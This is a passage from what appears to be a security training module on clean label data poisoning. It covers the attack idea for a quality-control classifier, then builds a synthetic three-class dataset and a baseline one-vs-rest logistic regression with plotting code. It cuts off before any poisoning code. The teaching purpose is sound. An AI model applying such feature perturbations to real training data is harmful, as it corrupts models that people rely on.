Using a `Clean Label Attack`, an adversary could take several training data examples originally labeled as `Major Defect`. They would then subtly alter the recorded `length` and `weight` features of these specific `Major Defect` examples. The perturbations would be designed to shift the feature representation of these parts closer to the region typically occupied by `Acceptable` parts in the feature space. However, these perturbed samples retain their original `Major Defect` designation within the poisoned training dataset.

When the quality control model is retrained on this manipulated data, it encounters data points labeled `Major Defect` that are situated closer to, or even within, the feature space region associated with `Acceptable` parts. To correctly classify these perturbed points according to their given `Major Defect` label while minimizing training error, the model is forced to adjust its learned `decision boundary` between Class 0 and Class 1. This induced adjustment could shift the boundary sufficiently to encompass the chosen `target instance` (the truly `Acceptable` batch), causing it to be misclassified as `Major Defect`. The attack succeeds without ever directly changing any labels in the training data, only modifying feature values subtly.

## The Dataset

To demonstrate this, we will create a synthetic dataset consisting of three classes, suitable for our quality control scenario. We will generate the data using the same `make_blobs` function. <p><p>Each instance
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐱</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>,</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{x}_i = (x_{i1}, x_{i2})</annotation></semantics></math>
will represent a part with two features (e.g., conceptual
<code>length</code> and <code>weight</code>), and the corresponding
label
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>
will belong to one of three classes:
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">{</mo><mn>0</mn><mo>,</mo><mn>1</mn><mo>,</mo><mn>2</mn><mo stretchy="false" form="postfix">}</mo></mrow><annotation encoding="application/x-tex">\{0, 1, 2\}</annotation></semantics></math>
(representing <code>Major Defect</code>, <code>Acceptable</code>,
<code>Minor Defect</code>). We will also apply feature scaling to
normalize the dataset.</p></p>


```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import make_blobs
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
from sklearn.preprocessing import StandardScaler
from sklearn.neighbors import NearestNeighbors
from sklearn.multiclass import OneVsRestClassifier
import seaborn as sns

# Color palette
htb_green = "#9fef00"
node_black = "#141d2b"
hacker_grey = "#a4b1cd"
white = "#ffffff"
azure = "#0086ff"       # Class 0
nugget_yellow = "#ffaf00" # Class 1
malware_red = "#ff3e3e"    # Class 2
vivid_purple = "#9f00ff"   # Highlight/Accent
aquamarine = "#2ee7b6"   # Highlight/Accent

# Configure plot styles
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": node_black,
        "axes.facecolor": node_black,
        "axes.edgecolor": hacker_grey,
        "axes.labelcolor": white,
        "text.color": white,
        "xtick.color": hacker_grey,
        "ytick.color": hacker_grey,
        "grid.color": hacker_grey,
        "grid.alpha": 0.1,
        "legend.facecolor": node_black,
        "legend.edgecolor": hacker_grey,
        "legend.frameon": True,
        "legend.framealpha": 0.8, # Slightly transparent legend background
        "legend.labelcolor": white,
        "figure.figsize": (12, 7), # Default figure size
    }
)

# Seed for reproducibility - MUST BE 1337
SEED = 1337
np.random.seed(SEED)

print("Setup complete. Libraries imported and styles configured.")

# Generate 3-class synthetic data
n_samples = 1500
centers_3class = [(0, 6), (4, 3), (8, 6)]  # Centers for three blobs
X_3c, y_3c = make_blobs(
    n_samples=n_samples,
    centers=centers_3class,
    n_features=2,
    cluster_std=1.15, # Standard deviation of clusters
    random_state=SEED,
)

# Standardize features
scaler = StandardScaler()
X_3c_scaled = scaler.fit_transform(X_3c)

# Split data into training and testing sets, stratifying by class
X_train_3c, X_test_3c, y_train_3c, y_test_3c = train_test_split(
    X_3c_scaled, y_3c, test_size=0.3, random_state=SEED, stratify=y_3c
)

print(f"\nGenerated {n_samples} samples with 3 classes.")
print(f"Training set size: {X_train_3c.shape[0]} samples.")
print(f"Testing set size: {X_test_3c.shape[0]} samples.")
print(f"Classes: {np.unique(y_3c)}")
print(f"Feature shape: {X_train_3c.shape}")
```

Running the code cell above generates our three-class dataset, standardizes the features, and splits it into training and testing sets. The output confirms the size and class distribution.

```python
Setup complete. Libraries imported and styles configured.

Generated 1500 samples with 3 classes.
Training set size: 1050 samples.
Testing set size: 450 samples.
Classes: [0 1 2]
Feature shape: (1050, 2)
```

Visualizing the clean training data is the best way to understand the initial separation between the classes before any attack occurs. We will adapt our plotting function to handle multiple classes and allow for highlighting specific points, which will be useful later for identifying the target and perturbed points.

```python
def plot_data_multi(
    X,
    y,
    title="Multi-Class Dataset Visualization",
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    """
    Plots a 2D multi-class dataset with class-specific colors and optional highlighting.
    Automatically ensures points marked with 'P' are plotted above all others.

    Args:
        X (np.ndarray): Feature data (n_samples, 2).
        y (np.ndarray): Labels (n_samples,).
        title (str): The title for the plot.
        highlight_indices (list | np.ndarray, optional): Indices of points in X to highlight. Defaults to None.
        highlight_markers (list, optional): Markers for highlighted points (recycled if shorter).
                                          Points with marker 'P' will be plotted on top. Defaults to ['o'].
        highlight_colors (list, optional): Edge colors for highlighted points (recycled). Defaults to [vivid_purple].
        highlight_labels (list, optional): Labels for highlighted points legend (recycled). Defaults to [''].
    """
    plt.figure(figsize=(12, 7))
    # Define colors based on the global palette for classes 0, 1, 2 (or more if needed)
    class_colors = [
        azure,
        nugget_yellow,
        malware_red,
    ]  # Extend if you have more than 3 classes
    unique_classes = np.unique(y)
    max_class_idx = np.max(unique_classes) if len(unique_classes) > 0 else -1
    if max_class_idx >= len(class_colors):
        print(
            f"{malware_red}Warning:{white} More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback color."
        )
        class_colors.extend([hacker_grey] * (max_class_idx + 1 - len(class_colors)))

    cmap_multi = plt.cm.colors.ListedColormap(class_colors)

    # Plot all non-highlighted points first
    plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_multi,
        edgecolors=node_black,
        s=50,
        alpha=0.7,
        zorder=1,  # Base layer
    )

    # Plot highlighted points on top if specified
    highlight_handles = []
    if highlight_indices is not None and len(highlight_indices) > 0:
        num_highlights = len(highlight_indices)
        # Provide defaults if None
        _highlight_markers = (
            highlight_markers
            if highlight_markers is not None
            else ["o"] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            if highlight_colors is not None
            else [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels if highlight_labels is not None else [""] * num_highlights
        )

        for i, idx in enumerate(highlight_indices):
            if not (0 <= idx < X.shape[0]):
                print(
                    f"{malware_red}Warning:{white} Invalid highlight index {idx} skipped."
                )
                continue

            # Determine marker, edge color, and label for this point
            marker = _highlight_markers[i % len(_highlight_markers)]
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            label = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based on the point's true class
            point_class = y[idx]
            try:
                face_color = class_colors[int(point_class)]
            except (IndexError, TypeError):
                print(
                    f"{malware_red}Warning:{white} Class index '{point_class}' invalid. Using fallback."
                )
                face_color = hacker_grey

            current_zorder = (
                3 if marker == "P" else 2
            )  # If marker is 'P', use zorder 3, else 2

            # Plot the highlighted point
            plt.scatter(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # Use the determined marker
                s=180,
                linewidths=2,
                alpha=1.0,
                zorder=current_zorder,  # Use the zorder determined by the marker
            )
            # Create legend handle if label exists
            if label:
                highlight_handles.append(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color="w",
                        label=label,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle="None",
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1 (Standardized)", fontsize=12)
    plt.ylabel("Feature 2 (Standardized)", fontsize=12)

    # Create class legend handles
    class_handles = []
    unique_classes_present = sorted(np.unique(y))
    for class_idx in unique_classes_present:
        try:
            int_class_idx = int(class_idx)
            class_handles.append(
                plt.Line2D(
                    [0],
                    [0],
                    marker="o",
                    color="w",
                    label=f"Class {int_class_idx}",
                    markersize=10,
                    markerfacecolor=class_colors[int_class_idx],
                    markeredgecolor=node_black,
                    linestyle="None",
                )
            )
        except (IndexError, TypeError):
            print(
                f"{malware_red}Warning:{white} Cannot create legend entry for class {class_idx}."
            )

    # Combine legends
    all_handles = class_handles + highlight_handles
    if all_handles:
        plt.legend(handles=all_handles, title="Classes & Points")

    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()


# Plot the initial clean training data
print("\n--- Visualizing Clean Training Data ---")
plot_data_multi(X_train_3c, y_train_3c, title="Original Training Data (3 Classes)")
```

![Scatter plot titled 'Original Training Data (3 Classes)' showing Class 0 (blue), Class 1 (orange), and Class 2 (red) across standardized Feature 1 and Feature 2.](/storage/modules/302/feature_clean_data.png)

The resulting plot displays our three classes (`Class 0: Azure`, `Class 1: Yellow`, `Class 2: Red`) distributed in the 2D standardized feature space. The clusters are reasonably well-separated, which will allow us to observe the effects of the attack more clearly.

---

<!-- section 3564 | page 11 | group: Feature Attacks | type: interactive -->

# Baseline One-vs-Rest Logistic Regression Model

---

Before attempting the `Clean Label Attack`, we need a reference point. We will establish `baseline performance` by training a model on the clean, original training data (`X_train_3c`, `y_train_3c`). This baseline shows the model's accuracy and the initial positions of its `decision boundaries` under normal conditions.

Since we have three classes, standard `Logistic Regression`, which is inherently binary, needs adaptation. A common approach is the `One-vs-Rest` (`OvR`) strategy, also known as `One-vs-All`. Scikit-learn provides the `OneVsRestClassifier` wrapper for this purpose.<p><p>In the <code>OvR</code> strategy for a problem with
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>K</mi><annotation encoding="application/x-tex">K</annotation></semantics></math>
classes (here,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">K=3</annotation></semantics></math>),
we train
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>K</mi><annotation encoding="application/x-tex">K</annotation></semantics></math>
independent binary logistic regression models. The
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>-th
model
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>∈</mo><mo stretchy="false" form="prefix">{</mo><mn>0</mn><mo>,</mo><mn>1</mn><mo>,</mo><mi>.</mi><mi>.</mi><mi>.</mi><mo>,</mo><mi>K</mi><mo>−</mo><mn>1</mn><mo stretchy="false" form="postfix">}</mo></mrow><annotation encoding="application/x-tex">k \in \{0, 1, ..., K-1\}</annotation></semantics></math>)
is trained to distinguish samples belonging to class
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>
(considered the "positive" class for this model) from samples belonging
to <code>any of the other</code>
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">K-1</annotation></semantics></math>
classes (all lumped together as the "negative" class).</p></p>
<p><p>Each binary model
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>
learns its own weight vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐰</mi><mi>k</mi></msub><annotation encoding="application/x-tex">\mathbf{w}_k</annotation></semantics></math>
and intercept (bias)
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>b</mi><mi>k</mi></msub><annotation encoding="application/x-tex">b_k</annotation></semantics></math>.
The decision function for the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>-th
model computes a score, often related to the signed distance from its
separating hyperplane or the log-odds of belonging to class
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>.
For a standard logistic regression core, this score is the linear
combination:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mi>k</mi></msub><mo>=</mo><msubsup><mi>𝐰</mi><mi>k</mi><mi>T</mi></msubsup><mi>𝐱</mi><mo>+</mo><msub><mi>b</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">z_k = \mathbf{w}_k^T \mathbf{x} + b_k</annotation></semantics></math></p></p>
<p><p>This
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mi>k</mi></msub><annotation encoding="application/x-tex">z_k</annotation></semantics></math>
value essentially represents the confidence of the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>-th
binary classifier that the input
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>
belongs to class
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>
versus all other classes.</p></p>
<p><p>To make a final prediction for a new input
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>,
the <code>OvR</code> strategy computes these scores
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>0</mn></msub><mo>,</mo><msub><mi>z</mi><mn>1</mn></msub><mo>,</mo><mi>.</mi><mi>.</mi><mi>.</mi><mo>,</mo><msub><mi>z</mi><mrow><mi>K</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">z_0, z_1, ..., z_{K-1}</annotation></semantics></math>
from all
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>K</mi><annotation encoding="application/x-tex">K</annotation></semantics></math>
binary models. The class assigned to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>
is the one corresponding to the model that produces the highest
score:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover><mi>y</mi><mo accent="true">̂</mo></mover><mo>=</mo><msub><mi>arg max</mi><mo>&#8289;</mo><mrow><mi>k</mi><mo>∈</mo><mo stretchy="false" form="prefix">{</mo><mn>0</mn><mo>,</mo><mi>…</mi><mo>,</mo><mi>K</mi><mo>−</mo><mn>1</mn><mo stretchy="false" form="postfix">}</mo></mrow></msub><msub><mi>z</mi><mi>k</mi></msub><mo>=</mo><msub><mi>arg max</mi><mo>&#8289;</mo><mrow><mi>k</mi><mo>∈</mo><mo stretchy="false" form="prefix">{</mo><mn>0</mn><mo>,</mo><mi>…</mi><mo>,</mo><mi>K</mi><mo>−</mo><mn>1</mn><mo stretchy="false" form="postfix">}</mo></mrow></msub><mo stretchy="false" form="prefix">(</mo><msubsup><mi>𝐰</mi><mi>k</mi><mi>𝖳</mi></msubsup><mi>𝐱</mi><mo>+</mo><msub><mi>b</mi><mi>k</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\hat{y}= \operatorname{arg\,max}_{k \in \{0,\dots,K-1\}} z_k= \operatorname{arg\,max}_{k \in \{0,\dots,K-1\}}(\mathbf{w}_k^{\mathsf T}\mathbf{x} + b_k)</annotation></semantics></math></p></p>
<p><p>The <code>decision boundary</code> separating any two classes, say
class
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>i</mi><annotation encoding="application/x-tex">i</annotation></semantics></math>
and class
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>j</mi><annotation encoding="application/x-tex">j</annotation></semantics></math>,
is the set of points
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>
where the scores assigned by their respective binary models are equal:
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mi>i</mi></msub><mo>=</mo><msub><mi>z</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">z_i = z_j</annotation></semantics></math>.
This equality defines a linear boundary (a line in our 2D case, a
hyperplane in higher dimensions):</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>𝐰</mi><mi>i</mi><mi>T</mi></msubsup><mi>𝐱</mi><mo>+</mo><msub><mi>b</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>𝐰</mi><mi>j</mi><mi>T</mi></msubsup><mi>𝐱</mi><mo>+</mo><msub><mi>b</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{w}_i^T \mathbf{x} + b_i = \mathbf{w}_j^T \mathbf{x} + b_j</annotation></semantics></math></p></p>


Rearranging this gives the equation of the separating hyperplane:<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐰</mi><mi>i</mi></msub><mo>−</mo><msub><mi>𝐰</mi><mi>j</mi></msub><msup><mo stretchy="false" form="postfix">)</mo><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>b</mi><mi>i</mi></msub><mo>−</mo><msub><mi>b</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(\mathbf{w}_i - \mathbf{w}_j)^T \mathbf{x} + (b_i - b_j) = 0</annotation></semantics></math></p></p>
<p><p>The overall effect is that the <code>OvR</code> classifier partitions
the feature space into
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>K</mi><annotation encoding="application/x-tex">K</annotation></semantics></math>
decision regions, separated by these piecewise linear boundaries.</p></p>


Let's train this baseline `OvR` model using `Logistic Regression` as the base estimator.

```python
print("\n--- Training Baseline Model ---")
# Initialize the base estimator
# Using 'liblinear' solver as it's good for smaller datasets and handles OvR well.
# C=1.0 is the default inverse regularization strength.
base_estimator = LogisticRegression(random_state=SEED, C=1.0, solver="liblinear")

# Initialize the OneVsRestClassifier wrapper using the base estimator
baseline_model_3c = OneVsRestClassifier(base_estimator)

# Train the OvR model on the clean training data
baseline_model_3c.fit(X_train_3c, y_train_3c)
print("Baseline OvR model trained successfully.")

# Predict on the clean test set to evaluate baseline performance
y_pred_baseline_3c = baseline_model_3c.predict(X_test_3c)

# Calculate baseline accuracy
baseline_accuracy_3c = accuracy_score(y_test_3c, y_pred_baseline_3c)
print(f"Baseline 3-Class Model Accuracy on Test Set: {baseline_accuracy_3c:.4f}")

# Prepare meshgrid for plotting decision boundaries
# We create a grid of points covering the feature space
h = 0.02  # Step size in the mesh
x_min, x_max = X_train_3c[:, 0].min() - 1, X_train_3c[:, 0].max() + 1
y_min, y_max = X_train_3c[:, 1].min() - 1, X_train_3c[:, 1].max() + 1
xx_3c, yy_3c = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))
# Combine xx and yy into pairs of coordinates for prediction
mesh_points_3c = np.c_[xx_3c.ravel(), yy_3c.ravel()]

# Predict classes for each point on the meshgrid using the trained baseline model
Z_baseline_3c = baseline_model_3c.predict(mesh_points_3c)
# Reshape the predictions back into the grid shape for contour plotting
Z_baseline_3c = Z_baseline_3c.reshape(xx_3c.shape)
print("Meshgrid predictions generated for baseline model.")

# Extract baseline model parameters (weights w_k and intercepts b_k)
# The fitted OvR classifier stores its individual binary estimators in the `estimators_` attribute
try:
    if (
        hasattr(baseline_model_3c, "estimators_")
        and len(baseline_model_3c.estimators_) == 3
    ):
        estimators_base = baseline_model_3c.estimators_
        # For binary LogisticRegression with liblinear, coef_ is shape (1, n_features) and intercept_ is (1,)
        # We extract them for each of the 3 binary classifiers (0 vs Rest, 1 vs Rest, 2 vs Rest)
        w0_base = estimators_base[0].coef_[0]  # Weight vector for class 0 vs Rest
        b0_base = estimators_base[0].intercept_[0]  # Intercept for class 0 vs Rest
        w1_base = estimators_base[1].coef_[0]  # Weight vector for class 1 vs Rest
        b1_base = estimators_base[1].intercept_[0]  # Intercept for class 1 vs Rest
        w2_base = estimators_base[2].coef_[0]  # Weight vector for class 2 vs Rest
        b2_base = estimators_base[2].intercept_[0]  # Intercept for class 2 vs Rest
        print(
            "Baseline model parameters (w0, b0, w1, b1, w2, b2) extracted successfully."
        )
    else:
        # This might happen if the model didn't fit correctly or classes were dropped
        raise RuntimeError(
            "Could not extract expected number of estimators from baseline OvR model."
        )
except Exception as e:
    print(f"Error: Failed to extract baseline parameters: {e}")
```

Now we define a function to visualize these multi-class decision boundaries and plot the baseline result.

```python
def plot_decision_boundary_multi(
    X,
    y,
    Z_mesh,
    xx_mesh,
    yy_mesh,
    title="Decision Boundary",
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    """
    Plots the decision boundary regions and data points for a multi-class classifier.
    Automatically ensures points marked with 'P' are plotted above other points.
    Explicit boundary lines are masked to only show in relevant background regions.

    Args:
        X (np.ndarray): Feature data for scatter plot (n_samples, 2).
        y (np.ndarray): Labels for scatter plot (n_samples,).
        Z_mesh (np.ndarray): Predicted classes on the meshgrid (shape matching xx_mesh).
        xx_mesh (np.ndarray): Meshgrid x-coordinates.
        yy_mesh (np.ndarray): Meshgrid y-coordinates.
        title (str): Plot title.
        highlight_indices (list | np.ndarray, optional): Indices of points in X to highlight.
        highlight_markers (list, optional): Markers for highlighted points.
                                          Points with marker 'P' will be plotted on top.
        highlight_colors (list, optional): Edge colors for highlighted points.
        highlight_labels (list, optional): Labels for highlighted points legend.
        boundary_lines (dict, optional): Dict specifying boundary lines to plot, e.g.,
            {'label': {'coeffs': (w_diff_x, w_diff_y), 'intercept': b_diff, 'color': 'color', 'style': 'linestyle'}}
    """
    plt.figure(figsize=(12, 7))  # Consistent figure size

    # Define base class colors and slightly transparent ones for contour fill
    class_colors = [azure, nugget_yellow, malware_red]  # Extend if more classes as needed
    # Add fallback colors if needed based on y and Z_mesh
    unique_classes_y = np.unique(y)
    max_class_idx_y = np.max(unique_classes_y) if len(unique_classes_y) > 0 else -1
    unique_classes_z = np.unique(Z_mesh)
    max_class_idx_z = np.max(unique_classes_z) if len(unique_classes_z) > 0 else -1
    max_class_idx = int(max(max_class_idx_y, max_class_idx_z))  # Ensure integer type

    if max_class_idx >= len(class_colors):
        print(
            f"Warning: More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback grey."
        )
        # Ensure enough colors exist for indexing up to max_class_idx
        needed_colors = max_class_idx + 1
        current_colors = len(class_colors)
        if current_colors < needed_colors:
            class_colors.extend([hacker_grey] * (needed_colors - current_colors))

    # Appending '60' provides approx 37% alpha in hex RGBA for contour map
    # Ensure colors used for cmap match the number of classes exactly
    light_colors = [
        c + "60" if len(c) == 7 and c.startswith("#") else c
        for c in class_colors[: max_class_idx + 1]
    ]
    cmap_light = plt.cm.colors.ListedColormap(light_colors)

    # Plot the decision boundary contour fill
    plt.contourf(
        xx_mesh,
        yy_mesh,
        Z_mesh,
        cmap=cmap_light,
        alpha=0.6,
        zorder=0,  # Ensure contour is lowest layer
    )

    # Plot the data points
    # Ensure cmap for points matches number of classes in y
    cmap_bold = (
        plt.cm.colors.ListedColormap(class_colors[: int(max_class_idx_y) + 1])
        if max_class_idx_y >= 0
        else plt.cm.colors.ListedColormap(class_colors[:1])
    )
    plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_bold,
        edgecolors=node_black,
        s=50,
        alpha=0.8,
        zorder=1,  # Points above contour
    )

    # Plot highlighted points if any
    highlight_handles = []
    if highlight_indices is not None and len(highlight_indices) > 0:
        num_highlights = len(highlight_indices)
        # Provide defaults if None
        _highlight_markers = (
            highlight_markers
            if highlight_markers is not None
            else ["o"] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            if highlight_colors is not None
            else [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels if highlight_labels is not None else [""] * num_highlights
        )

        for i, idx in enumerate(highlight_indices):
            # Check index validity gracefully
            if not (0 <= idx < X.shape[0]):
                print(
                    f"Warning: Invalid highlight index {idx} skipped."
                )
                continue

            # Determine marker, edge color, and label for this point
            marker = _highlight_markers[i % len(_highlight_markers)]  # Get the marker
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            label = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based on the point's true class from y
            try:
                # Ensure point_class is a valid integer index for class_colors
                point_class = int(y[idx])
                if not (0 <= point_class < len(class_colors)):
                    raise IndexError
                face_color = class_colors[point_class]
            except (IndexError, ValueError, TypeError):
                print(
                    f"Warning: Class index '{y[idx]}' invalid for highlighted point {idx}. Using fallback."
                )
                face_color = hacker_grey  # Fallback

            current_zorder = (
                3 if marker == "P" else 2
            )  # If marker is 'P', use zorder 3, else 2

            # Plot the highlighted point
            plt.scatter(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # Use the determined marker
                s=180,
                linewidths=2,
                alpha=1.0,  # Make highlighted points fully opaque
                zorder=current_zorder,  # Use the zorder determined by the marker
            )
            # Create legend handle if label exists
            if label:
                # Use Line2D for better control over legend marker appearance
                highlight_handles.append(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color="w",
                        label=label,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle="None",
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1 (Standardized)", fontsize=12)
    plt.ylabel("Feature 2 (Standardized)", fontsize=12)

    # Create class legend handles (based on unique classes in y)
    class_handles = []
    # Check if y is not empty before finding unique classes
    if y.size > 0:
        unique_classes_present_y = sorted(np.unique(y))
        for class_idx in unique_classes_present_y:
            try:
                int_class_idx = int(class_idx)
                # Check if index is valid for the potentially extended class_colors
                if 0 <= int_class_idx < len(class_colors):
                    class_handles.append(
                        plt.Line2D(
                            [0],
                            [0],
                            marker="o",
                            color="w",
                            label=f"Class {int_class_idx}",
                            markersize=10,
                            markerfacecolor=class_colors[int_class_idx],
                            markeredgecolor=node_black,
                            linestyle="None",
                        )
                    )
                else:
                    print(
                        f"Warning: Cannot create class legend entry for class {int_class_idx}, color index out of bounds after potential extension."
                    )
            except (ValueError, TypeError):
                print(
                    f"Warning: Cannot create class legend entry for non-integer class {class_idx}."
                )
    else:
        print(
            f"Info: No data points (y is empty), skipping class legend entries."
        )

    # Combine legends
    all_handles = class_handles + highlight_handles
    if all_handles:  # Only show legend if there's something to legend
        plt.legend(handles=all_handles, title="Classes, Points & Boundaries")

    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    # Ensure plot limits strictly match the meshgrid range used for contourf
    plt.xlim(xx_mesh.min(), xx_mesh.max())
    plt.ylim(yy_mesh.min(), yy_mesh.max())
    plt.show()


# Plot the decision boundary for the baseline model using the pre-calculated Z_baseline_3c
print("\n--- Visualizing Baseline Model Decision Boundaries ---")
plot_decision_boundary_multi(
    X_train_3c,  # Training data points
    y_train_3c,  # Training labels
    Z_baseline_3c,  # Meshgrid predictions from baseline model
    xx_3c,  # Meshgrid x coordinates
    yy_3c,  # Meshgrid y coordinates
    title=f"Baseline Model Decision Boundaries (3 Classes)\nTest Accuracy: {baseline_accuracy_3c:.4f}",
)
```

The plot below shows the decision regions learned by the baseline model. Each colored region represents the area of the feature space where the model would predict the corresponding class (`Azure` for Class 0, `Yellow` for Class 1, `Red` for Class 2). The lines where the colors meet are the effective decision boundaries.

![Scatter plot titled 'Baseline Model Decision Boundaries (3 Classes)' with test accuracy 0.9600, showing Class 0 (blue), Class 1 (orange), and Class 2 (red) across standardized Feature 1 and Feature 2.](/storage/modules/302/feature_clean_boundary.png)

---

<!-- section 3565 | page 12 | group: Feature Attacks | type: interactive -->

# Identifying a Target
---
<p><p>Now that we have a baseline, we can proceed with the actual
<code>Clean Label Attack</code>. Our specific goal is to modify the
training data such that a chosen <code>target point</code>,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>,
which originally belongs to <code>Class 1</code> (Yellow), will be
misclassified by the retrained model as belonging to
<code>Class 0</code> (Blue).</p></p>
<p><p>We aim to choose a point that genuinely belongs to
<code>Class 1</code> (its true label
